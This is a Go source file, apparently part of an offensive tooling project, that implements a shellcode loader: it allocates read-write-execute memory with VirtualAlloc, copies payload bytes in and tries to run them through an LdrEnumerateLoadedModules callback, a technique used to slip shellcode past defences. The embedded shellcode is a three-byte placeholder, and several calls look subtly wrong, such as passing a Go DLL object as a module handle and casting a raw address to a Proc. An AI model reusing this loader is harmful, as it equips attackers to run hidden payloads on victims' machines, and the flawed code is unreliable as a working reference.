package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

// alfarom256 calc shellcode
var op = []byte{
	0xfc, 0x48, 0x83,
}

//todo

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

type LDR_DATA_TABLE_ENTRY struct {
	// The Go struct is simplified and only contains the necessary fields
	DllBase     uintptr
	BaseDllName UNICODE_STRING
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type LdrEnumCallback uintptr

func Run(op []byte) {
	kernel32, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		fmt.Printf("Error loading kernel32.dll: %v\n", err)
		return
	}

	getProcAddress, err := kernel32.FindProc("GetProcAddress")
	if err != nil {
		fmt.Printf("Error finding GetProcAddress: %v\n", err)
		return
	}

	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		fmt.Printf("Error loading ntdll.dll: %v\n", err)
		return
	}

	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	if err != nil {
		fmt.Printf("Error finding VirtualAlloc: %v\n", err)
		return
	}
	lder, _ := syscall.UTF16PtrFromString("LdrEnumerateLoadedModules")
	ldrEnumerateLoadedModulesAddr, _, err := getProcAddress.Call(uintptr(unsafe.Pointer(ntdll)), uintptr(unsafe.Pointer(lder)))
	if err != nil && err != syscall.Errno(0) {
		fmt.Printf("Error calling GetProcAddress for LdrEnumerateLoadedModules: %v\n", err)
		return
	}

	addr, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil && err != syscall.Errno(0) {
		fmt.Printf("Error calling VirtualAlloc: %v\n", err)
		return
	}

	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	ldrEnumerateLoadedModulesCallback := syscall.NewCallbackCDecl(func(moduleInformation *LDR_DATA_TABLE_ENTRY, parameter uintptr, stop *bool) uintptr {
		callback := *(*LdrEnumCallback)(unsafe.Pointer(addr))
		return uintptr(callback)
	})

	ldrEnumerateLoadedModules := (*syscall.Proc)(unsafe.Pointer(ldrEnumerateLoadedModulesAddr))
	_, _, err = ldrEnumerateLoadedModules.Call(uintptr(unsafe.Pointer(ldrEnumerateLoadedModulesCallback)), 0)
	if err != nil && err != syscall.Errno(0) {
		fmt.Printf("Error calling LdrEnumerateLoadedModules: %v\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
